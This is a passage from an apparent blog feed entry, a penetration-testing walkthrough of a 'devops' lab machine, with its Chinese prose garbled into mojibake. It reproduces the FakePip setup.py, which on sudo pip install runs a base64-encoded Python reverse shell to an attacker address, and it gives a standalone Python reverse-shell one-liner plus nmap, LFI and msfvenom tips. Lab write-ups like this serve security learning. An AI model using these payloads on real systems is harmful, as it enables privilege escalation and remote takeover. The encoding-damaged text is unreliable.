·æ‰èƒ½é€šè¿‡pipæ¥è·å–rootæƒé™å‘¢ï¼Ÿè¿™é‡Œç”¨åˆ°ä¸€ä¸ªgithubä¸Šçš„å¼€æºè„šæœ¬Fakepipã€‚è¿™ä¸ªè„šæœ¬é€šè¿‡åœ¨pipé‡æ–°å®‰è£…æ—¶æ‰§è¡Œçš„setup.pyæ–‡ä»¶ä¸­æ’å…¥shellcodeï¼Œå¯¼è‡´å…¶å¯é€šè¿‡pipåå¼¹rootæƒé™çš„shellç»™æ”»å‡»æœºã€‚é¡¹ç›®åœ°å€(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p><p>â€‹    æ¥ä¸‹æ¥åœ¨æ”»å‡»æœºä¸ŠæŠŠFakepipç»™gitä¸‹æ¥,ç„¶åè¿›å…¥Fakepipç›®å½•,å°†setup.pyä¸­çš„RHOSTå‚æ•°æ”¹ä¸ºæ”»å‡»æœºåœ°å€:192.168.1.107,ç„¶åå¯åŠ¨pythonçš„ç®€æ˜“æœåŠ¡å™¨ã€‚</p><pre><code>from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install):  def run(self):    install.run(self)    RHOST = &#39;192.168.1.107&#39;  # change this    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; lhost = \&#39;%s\&#39;; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39; % RHOST    encoded = base64.b64encode(reverse_shell)    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)setup(name=&#39;FakePip&#39;,      version=&#39;0.0.1&#39;,      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,      author=&#39;zc00l&#39;,      author_email=&#39;andre.marques@esecurity.com.br&#39;,      license=&#39;MIT&#39;,      zip_safe=False,      cmdclass={&#39;install&#39;: CustomInstall})</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f5460351.png" class="lazyload"></p><p>â€‹    ç„¶ååœ¨devopsé¶æœºä¸Šç”¨<code>wget http://192.168.1.107/setup.py</code> å°†æ”»å‡»æœºä¸Šçš„setup.pyä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ”»å‡»æœºkaliå¼€å§‹ç”¨ncç›‘å¬443ç«¯å£ï¼Œå‡†å¤‡æ¥æ”¶å³å°†åˆ°æ¥çš„shellã€‚</p><p>â€‹    åœ¨devopsé¶æœºä¸Šå‘½ä»¤pipé‡è£…ï¼š<code>sudo pip install ./ --upgrade --force-install</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" class="lazyload"></p><p>â€‹    kaliå…´å¥‹åœ°ä¸€æŠŠæ¥åˆ°åå¼¹è¿‡æ¥çš„shellï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" class="lazyload"></p><p><code>cd root</code> ,ç„¶å<code>cat root.txt</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" class="lazyload"></p><p>â€‹    èŒæ–°çš„æ¸—é€åˆ°æ­¤æš‚åœemmmmã€‚</p><hr><h2 id="0x01-å°çŸ¥è¯†"><a href="#0x01-å°çŸ¥è¯†" class="headerlink" title="0x01 å°çŸ¥è¯†"></a>0x01 å°çŸ¥è¯†</h2><hr><h3 id="nmap-plus"><a href="#nmap-plus" class="headerlink" title="nmap plus"></a>nmap plus</h3><p>1.ç‰¹æ®Šæ‰«ææ–¹å¼ ==&gt; nmap -sV/-sP/-sS/sL  å…¶ä¸­-sPæ˜¯ç”¨äºæ‰«æIPæ®µçš„</p><p>2.è¯¦ç»†åœ°æ‰«æç›®æ ‡ï¼š</p><p>nmap -sV æˆ–è€… nmap -p- -A  &lt;ç›®æ ‡ip&gt;</p><p>æˆ–è€…è¶…å¼ºåŠ›çš„ï¼š nmap -sS -sV  -A  -p- &lt;ç›®æ ‡ip&gt;</p><hr><h3 id="python-åå¼¹shell-amp-pip-get-shell"><a href="#python-åå¼¹shell-amp-pip-get-shell" class="headerlink" title="python åå¼¹shell &amp; pip get shell"></a>python åå¼¹shell &amp; pip get shell</h3><p>python åå¼¹ shell:</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span></code></pre><p>pythonæ„é€ å®Œå…¨äº¤äº’å¼ç»ˆç«¯ :</p><pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><hr><h3 id="php-filter-and-input-â€“LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#php-filter-and-input-â€“LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="php filter and input â€“LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"></a>php filter and input â€“LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</h3><p>å‚è€ƒ <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p><p>php://filter,php://input,php://outputéƒ½æ˜¯æœ‰å¦™ç”¨çš„å“¦ï¼</p><hr><h3 id="msfvenom-p-ç”Ÿæˆshell"><a href="#msfvenom-p-ç”Ÿæˆshell" class="headerlink" title="msfvenom -p   ç”Ÿæˆshell"></a>msfvenom -p   ç”Ÿæˆshell</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" class="lazyload"></p><p>â€‹    ä½†åœ¨æ¸—é€è¿‡ç¨‹ä¸­å‘ç°ï¼Œä¸ç”¨msfvenomç”Ÿæˆçš„åŠ å¯†shellä¹Ÿèƒ½æˆåŠŸåå¼¹ï¼Œä¸è¿‡è¿˜æ˜¯è¦å…»æˆå¥½ä¹ æƒ¯ï¼Œå¤šç”¨ç”¨è¿™ç§ç¥å™¨æé«˜æ•ˆç‡å¹¶ä¸”å‡†ç¡®ç‡ã€‚</p><p>å‚è€ƒé“¾æ¥ <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p><hr><h3 id="linux-ä¸­çš„ä¸€äº›å‘½ä»¤ä¸ç‰¹æ€§"><a href="#linux-ä¸­çš„ä¸€äº›å‘½ä»¤ä¸ç‰¹æ€§" class="headerlink" title="linux ä¸­çš„ä¸€äº›å‘½ä»¤ä¸ç‰¹æ€§"></a>linux ä¸­çš„ä¸€äº›å‘½ä»¤ä¸ç‰¹æ€§</h3><p>==&gt; su &amp; sudo </p><p>å¯ç”¨äºåˆ‡æ¢ç”¨æˆ·</p><p>==&gt; lsattr æ˜¯ lsçš„å‡çº§ç‰ˆï¼Œå°±å¦‚aptitude ä¸aptç›¸ä¼¼ä¸€æ ·</p><p>==&gt; find / -user root 2&gt;/dev/null æŸ¥çœ‹ç”¨æˆ·å±æ€§ä¸ºrootçš„æ–‡ä»¶</p><p>==&gt;ps -aux æŸ¥çœ‹æ‰€æœ‰æœåŠ¡  ==&gt;top æŸ¥çœ‹è¿›ç¨‹</p><hr><h2 id="0x02-æ€»ç»“"><a href="#0x02-æ€»ç»“" class="headerlink" title="0x02 æ€»ç»“"></a>0x02 æ€»ç»“</h2><p>â€‹    æ¸—é€ä¸€å®šä¸€å®šæ³¨æ„ä¿¡æ¯æ”¶é›†ï¼Œæ€ç»´æ‹“å±•ï¼Œç„¶åå°±æ˜¯æ‰å®çš„åŸºç¡€ï¼</p><p>â€‹    å¦‚æœæ²¡æœ‰é‚£ä¹ˆå¼ºçš„èƒ½åŠ›ï¼Œæ¸—é€ç¡®å®æœ‰ç‚¹åƒåŠ›ï¼Œä½†æ˜¯åƒåŠ›çš„è¿‡ç¨‹ä¹Ÿåœ¨è¿›æ­¥ï¼Œå°±åƒä¸åœçš„è¢«è™çš„è¿‡ç¨‹ï¼Œè‡ªç„¶è‡ªå·±çš„ç­‰çº§ä¹Ÿåœ¨æé«˜ï¼Œä¸åœåœ°è†œå¤§ç¥çš„æ–‡ç« çš„åŒæ—¶ï¼Œè‡ªå·±ä¹Ÿä¼šå—å…¶å½±å“ï¼Œä½œä¸ºè€è…Šè‚‰ï¼Œåªèƒ½ç»§ç»­å­¦ä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
